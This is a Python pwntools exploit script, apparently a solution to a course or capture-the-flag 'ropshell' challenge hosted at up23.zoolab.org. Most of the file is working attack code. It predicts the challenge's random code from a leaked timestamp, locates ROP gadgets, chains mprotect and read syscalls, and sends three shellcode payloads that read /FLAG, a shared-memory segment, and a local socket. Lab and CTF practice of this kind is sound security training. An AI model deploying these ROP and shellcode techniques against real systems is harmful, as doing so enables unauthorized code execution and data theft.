#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
import time

context.arch = 'amd64'
context.os = 'linux'


def ROP_gadget(payload_Task):
    payload = b''
    #mprotect
    payload += p64(code_start + pop_rax)
    payload += p64(10)
    payload += p64(code_start + pop_rdi)
    payload += p64(code_start)
    payload += p64(code_start + pop_rsi)
    payload += p64(code_length)
    payload += p64(code_start + pop_rdx)
    payload += p64(0x07)
    payload += p64(code_start + syscall)

    #read
    payload += p64(code_start + pop_rax)
    payload += p64(0)
    payload += p64(code_start + pop_rdi)
    payload += p64(0)
    payload += p64(code_start + pop_rsi)
    payload += p64(code_start)
    payload += p64(code_start + pop_rdx)
    payload += p64(len(payload_Task))
    payload += p64(code_start + syscall)

    #ret addr
    payload += p64(code_start)
    '''
    #exit(37)
    payload += p64(code_start + pop_rax)
    payload += p64(60)
    payload += p64(code_start + pop_rdi)
    payload += p64(37)
    payload += p64(code_start + syscall)
    '''
    #print("First stage shellcode: (len: ", len(payload))
    #print(payload)

    return payload



r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
    #r = process("./myropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)


r.recvuntilS(b"**")
Timestamp = r.recvline().decode().split(" ")[3]
code = r.recvline().decode().split(" ")[5]
code_start = int(code, base=16)
code_length = 10*0x10000

libc = ctypes.CDLL("libc.so.6")
mask = 2 ** 32 - 1
codeint = []
libc.srand(int(Timestamp))
for i in range(code_length // 4):
    codeint.append((libc.rand() << 16 & mask) | (libc.rand() & 0xffff))

codeint[libc.rand() % (code_length // 4 - 1)] = 0xc3050f

byte_codeint = bytearray()
for i in codeint:
    byte_codeint.extend(struct.pack('<I', i))

pop_rax = byte_codeint.find(asm("pop rax;ret"))
pop_rdx = byte_codeint.find(asm("pop rdx;ret"))
pop_rdi = byte_codeint.find(asm("pop rdi;ret"))
pop_rsi = byte_codeint.find(asm("pop rsi;ret"))
syscall = byte_codeint.find(asm("syscall;ret"))

#Task 1-----------------------------------------------
shellcode_1 = ''
shellcode_1 += shellcraft.open("/FLAG", 0x0)#O_RDONLY
shellcode_1 += shellcraft.mov('rdi', 'rax')
shellcode_1 += shellcraft.read('rax', 'rsp', 0x100)
shellcode_1 += shellcraft.write(1, 'rsp', 'rax')
shellcode_1 += shellcraft.close('rdi')
shellcode_1 += shellcraft.exit(37)

payload_1 = asm(shellcode_1)

#Task 2-----------------------------------------------
shellcode_2 = ''
#shmget
shellcode_2 += shellcraft.mov('rax', 0x1d) 
shellcode_2 += shellcraft.mov('rdi', 0x1337)
shellcode_2 += shellcraft.mov('rsi', 0x1000)#4096
shellcode_2 += shellcraft.mov('rdx', 0x0)
shellcode_2 += shellcraft.syscall()

#shmat
shellcode_2 += shellcraft.mov('rdi', 'rax')
shellcode_2 += shellcraft.mov('rax', 0x1e)
shellcode_2 += shellcraft.mov('rsi', 0x0)
shellcode_2 += shellcraft.mov('rdx', 0x1000)#SHM_RDONLY
shellcode_2 += shellcraft.syscall()

#write
shellcode_2 += shellcraft.mov('rbx', 'rax')
shellcode_2 += shellcraft.strlen('rbx', 'rcx')
shellcode_2 += shellcraft.write(1, 'rbx', 'rcx')

#shmdt
shellcode_2 += shellcraft.mov('rax', 0x43)
shellcode_2 += shellcraft.mov('rdi', 'rbx')
shellcode_2 += shellcraft.syscall()
shellcode_2 += shellcraft.exit(37)

payload_2 = asm(shellcode_2)

#Task 3-----------------------------------------------
shellcode_3 = ''
shellcode_3 += shellcraft.socket()
shellcode_3 += shellcraft.mov('rdi', 'rax')
shellcode_3 += shellcraft.connect('127.0.0.1', 0x1337)
shellcode_3 += shellcraft.read('rdi', 'rsp', 0x100)
shellcode_3 += shellcraft.write(1, 'rsp', 'rax')
shellcode_3 += shellcraft.close('rdi')
shellcode_3 += shellcraft.exit(37)

payload_3 = asm(shellcode_3)


#Task 1-----------------------------------------------
r.sendafter(b'shell> ', ROP_gadget(payload_1))
r.sendafter(b'bytes command received.\n', payload_1)

ret_1 = r.recvuntil(b'\n', drop=True)
print(ret_1.decode())
#print("Task 1: ", ret_1.decode())
#print(r.recvline().decode())

#Task 2-----------------------------------------------
r.sendafter(b'shell> ', ROP_gadget(payload_2))
r.sendafter(b'bytes command received.\n', payload_2)

ret_2 = r.recvuntil(b'\n', drop=True)
print(ret_2.decode())
#print("Task 2: ", ret_2.decode())
#print(r.recvline().decode())

#Task 3-----------------------------------------------
r.sendafter(b'shell> ', ROP_gadget(payload_3))
r.sendafter(b'bytes command received.\n', payload_3)

ret_3 = r.recvuntil(b'\n', drop=True)
print(ret_3.decode())
#print("Task 3: ", ret_3.decode())
#print(r.recvline().decode())

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
